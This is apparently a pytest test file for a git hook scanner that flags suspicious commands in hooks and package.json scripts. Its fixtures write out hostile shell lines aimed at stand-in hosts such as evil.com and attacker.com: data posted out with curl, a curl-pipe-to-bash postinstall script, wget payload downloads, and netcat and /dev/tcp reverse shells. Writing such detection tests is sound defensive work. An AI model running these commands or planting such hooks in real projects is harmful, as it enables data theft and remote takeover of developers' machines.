"""Tests for Git Hook Guard"""

import pytest
import tempfile
import json
import os
from pathlib import Path
from unittest.mock import patch, mock_open
from gateway.security.git_guard import GitGuard, SecurityFinding


class TestGitGuard:
    
    def setup_method(self):
        self.guard = GitGuard()
    
    def test_scan_git_repository_clean_repo_passes(self):
        """Test that a clean repo passes git scanning."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a .git/hooks directory with benign scripts
            hooks_dir = Path(temp_dir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)
            
            # Create a clean hook
            clean_hook = hooks_dir / "pre-commit"
            clean_hook.write_text("#!/bin/bash\necho 'Running tests'\npytest tests/")
            clean_hook.chmod(0o755)
            
            findings = self.guard.scan_git_repository(temp_dir)
            assert len(findings) == 0
    
    def test_scan_git_repository_malicious_hook_flagged(self):
        """Test that malicious hooks are flagged."""
        with tempfile.TemporaryDirectory() as temp_dir:
            hooks_dir = Path(temp_dir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)
            
            # Create malicious hook with curl
            malicious_hook = hooks_dir / "post-receive"
            malicious_hook.write_text("#!/bin/bash\ncurl -X POST http://evil.com/data")
            malicious_hook.chmod(0o755)
            
            findings = self.guard.scan_git_repository(temp_dir)
            assert len(findings) >= 1
            assert any("curl" in finding.description.lower() for finding in findings)
    
    def test_scan_git_repository_package_json_suspicious(self):
        """Test detection of suspicious package.json scripts."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create package.json with suspicious scripts
            package_json = Path(temp_dir) / "package.json"
            suspicious_package = {
                "name": "evil-project",
                "scripts": {
                    "postinstall": "curl -s http://evil.com/install.sh | bash"
                }
            }
            with open(package_json, 'w') as f:
                json.dump(suspicious_package, f)
            
            findings = self.guard.scan_git_repository(temp_dir)
            assert len(findings) >= 1
            assert any("curl" in finding.description.lower() for finding in findings)
    
    def test_scan_git_repository_multiple_suspicious_patterns(self):
        """Test detection of multiple suspicious patterns."""
        with tempfile.TemporaryDirectory() as temp_dir:
            hooks_dir = Path(temp_dir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)
            
            # Create hook with multiple suspicious patterns
            hook = hooks_dir / "pre-push"
            hook.write_text("""#!/bin/bash
                wget http://malware.com/payload
                nc -e /bin/bash attacker.com 4444
                bash -i >& /dev/tcp/evil.com/8080 0>&1
                echo 'dGVzdCBwYXlsb2Fk' | base64 -d
            """)
            hook.chmod(0o755)
            
            findings = self.guard.scan_git_repository(temp_dir)
            assert len(findings) >= 4  # Should find multiple issues
    
    def test_scan_git_repository_non_executable_ignored(self):
        """Test that non-executable hooks are ignored."""
        with tempfile.TemporaryDirectory() as temp_dir:
            hooks_dir = Path(temp_dir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)
            
            # Create non-executable hook with suspicious content
            hook = hooks_dir / "pre-commit"
            hook.write_text("#!/bin/bash\ncurl -X POST http://evil.com/data")
            hook.chmod(0o644)  # Not executable
            
            findings = self.guard.scan_git_repository(temp_dir)
            # Should not find issues in non-executable files
            curl_findings = [f for f in findings if "curl" in f.description.lower()]
            assert len(curl_findings) == 0
    
    def test_scan_git_repository_no_git_directory(self):
        """Test handling of directory without .git folder."""
        with tempfile.TemporaryDirectory() as temp_dir:
            findings = self.guard.scan_git_repository(temp_dir)
            assert isinstance(findings, list)  # Should handle gracefully
    
    def test_security_finding_structure(self):
        """Test SecurityFinding dataclass structure."""
        # This test verifies the SecurityFinding class has required fields
        finding = SecurityFinding(
            file_path="/test/hook",
            line_number=5,
            pattern_type="COMMAND_INJECTION",
            description="Suspicious curl command",
            threat_level=None  # Will be set by the system
        )
        
        assert finding.file_path == "/test/hook"
        assert finding.line_number == 5
        assert finding.pattern_type == "COMMAND_INJECTION"
        assert finding.description == "Suspicious curl command"
    
    def test_suspicious_patterns_comprehensive(self):
        """Test that all required suspicious patterns are detected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            hooks_dir = Path(temp_dir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)
            
            # Test each suspicious pattern individually
            suspicious_commands = [
                ("curl", "curl http://evil.com"),
                ("wget", "wget https://malware.net/payload"), 
                ("nc", "nc -e /bin/bash attacker.com 4444"),
                ("bash -i", "bash -i >& /dev/tcp/evil.com/8080"),
                ("/dev/tcp", "/dev/tcp/attacker.com/4444"),
                ("base64", "echo 'dGVzdA==' | base64 -d")
            ]
            
            for i, (pattern, cmd) in enumerate(suspicious_commands):
                hook = hooks_dir / f"test-hook-{i}"
                hook.write_text(f"#!/bin/bash\n{cmd}")
                hook.chmod(0o755)
            
            findings = self.guard.scan_git_repository(temp_dir)
            assert len(findings) >= len(suspicious_commands)
